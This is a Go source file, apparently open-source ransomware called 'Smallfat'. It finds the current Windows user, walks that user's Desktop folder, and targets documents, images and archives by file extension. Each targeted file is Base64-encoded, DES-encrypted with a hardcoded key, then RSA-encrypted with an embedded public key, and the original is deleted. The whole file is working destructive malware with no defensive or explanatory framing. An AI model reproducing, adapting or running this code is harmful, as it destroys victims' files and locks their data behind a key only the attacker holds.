package main

import (
	"bytes"
	"crypto/cipher"
	"crypto/des"
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"encoding/base64"
	"encoding/pem"
	"io/ioutil"
	"os"
	"os/exec"
	"path"
	"strings"
)

var (
	WhiteList = map[string]string{ //加密文件白名单
		//document
		"word_before":  ".doc",
		"word_after":   ".docx",
		"excel_before": ".xls",
		"excel_afte":   ".xlsx",
		"powerpoint":   ".pptx",
		"pdf":          ".pdf",
		"wps_on":       ".dot",
		"wps_two":      ".dotx",
		"txt":          ".txt",
		//images
		"images1": ".jpg",
		"images2": ".jpeg",
		"images3": ".png",
		"images4": ".gif",
		"images5": ".bmp",
		"images6": ".tiff",
		"images7": ".ai",
		"images8": ".cdr",
		"images9": ".eps",
		//compression
		"rar": ".rar",
		"7z":  ".7z",
		"zip": ".zip",
	}
	key       = []byte("Smallfat") //密钥
	publicKey = []byte(` 
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtxlZg6F+OS+JnfjUZ7Hq
QL1Mj/MTWUm9XmPLnCrrdEep36e50HtQqpzL8hYTPTGDW1B0do0u5EKDpZWGZVFO
5JvSOY6Oilf3XwhO8aM3zrnotRc2duT6Mtm9iOtpUabwl4QtlNFTCbFWPy+h4gdm
/ANkyWSThHmxwHs5jepotxPHTQNTiJ5gsLL2NjX3Jg5PtYv7hefZy9EGHL0D40X3
ylwvqTP9CHNBupz9SMv4K/xh8NaufCMsi9lg3VK42HO0aKqATEgCP0TN8i+XSXAO
yawQiSR70Dj7RQt3ezcgzT7HsoF5y+470TQHBRMDu+NHAWW4n8Dd/0rcqtRgC2HJ
gwIDAQAB
-----END PUBLIC KEY-----
`)
)

func Del_File(fileName string) {
	err := os.Remove(fileName)
	if err != nil {
		return
	}
}

func Write_File(fileName string, RSAContent []byte) {
	//写入文件
	content := `https://github.com/RuanLang0777/Smallfat` + "\r\n\r\n" + string(RSAContent)
	baseName := path.Base(fileName)           // 获取文件名+后缀
	ext := path.Ext(baseName)                 // 获取后缀
	name := strings.TrimSuffix(baseName, ext) //获取文件名
	err := ioutil.WriteFile(name+"_Smallfat"+ext, []byte(content), 0777)
	Del_File(fileName)
	if err != nil {
		return
	}
}

func Base64(fileName string) []byte {
	//Base64编码->反转->Base64编码
	file_byte, _ := ioutil.ReadFile(fileName)
	encryption := base64.StdEncoding.EncodeToString(file_byte)
	reverses := Reverse(encryption)
	reverses_encryption := base64.StdEncoding.EncodeToString([]byte(reverses))
	return []byte(reverses_encryption)

}

func MyDESEncrypt(origData, key []byte) []byte {
	//DES加密
	block, _ := des.NewCipher(key)
	origData = PKCS5Padding(origData, block.BlockSize())
	blockMode := cipher.NewCBCEncrypter(block, key)
	crypted := make([]byte, len(origData))
	blockMode.CryptBlocks(crypted, origData)
	return crypted

}

func MyRSAEncrypt(src, publicKeyByte []byte) (bytesEncrypt []byte) {
	//RSA加密
	block, _ := pem.Decode(publicKeyByte)
	publicKey, _ := x509.ParsePKIXPublicKey(block.Bytes)
	keySize, srcSize := publicKey.(*rsa.PublicKey).Size(), len(src)
	pub := publicKey.(*rsa.PublicKey)
	offSet, once := 0, keySize-11
	buffer := bytes.Buffer{}
	for offSet < srcSize {
		endIndex := offSet + once
		if endIndex > srcSize {
			endIndex = srcSize
		}
		bytesOnce, _ := rsa.EncryptPKCS1v15(rand.Reader, pub, src[offSet:endIndex])
		buffer.Write(bytesOnce)
		offSet = endIndex
	}
	bytesEncrypt = buffer.Bytes()
	return
}

func PKCS5Padding(ciphertext []byte, blockSize int) []byte {
	padding := blockSize - len(ciphertext)%blockSize
	padtext := bytes.Repeat([]byte{byte(padding)}, padding)
	return append(ciphertext, padtext...)
}

func Reverse(enbase64 string) string {
	//反转
	a := []rune(enbase64)
	for i, j := 0, len(a)-1; i < j; i, j = i+1, j-1 {
		a[i], a[j] = a[j], a[i]
	}
	return string(a)
}
func Get_User() []string {
	//获取用户名
	cmd := exec.Command("whoami")
	out, _ := cmd.CombinedOutput()
	whoami := strings.Split(string(out), "\\")
	return whoami
}

func WalkDir(filepath string) ([]string, error) {
	//递归遍历文件
	files, _ := ioutil.ReadDir(filepath) // 遍历所有文件/目录
	var allfile []string                 //存放文件路径
	for _, v := range files {
		fullPath := filepath + "\\" + v.Name() // 全路径 + 文件/目录
		if v.IsDir() {
			a, _ := WalkDir(fullPath) // 递归遍历
			allfile = append(allfile, a...)
		} else {
			allfile = append(allfile, fullPath) // 如果不是目录，追加至
		}
	}

	return allfile, nil
}

func Smallfat() {
	Users := Get_User()
	paths := `C:\Users\` + Users[1] + `\Desktop`
	desktop := strings.Replace(paths, "\r\n", "", 1)
	files, _ := WalkDir(desktop)
	for _, fileName := range files {
		SuffixName := path.Ext(fileName)
		for _, SuffixVule := range WhiteList {
			if SuffixName == SuffixVule {
				Base64Content := Base64(fileName)
				DESContent := MyDESEncrypt(Base64Content, key)
				RSAContent := MyRSAEncrypt(DESContent, publicKey)
				Write_File(fileName, RSAContent)
			}
		}
	}
}

func main() {
	Smallfat()
}
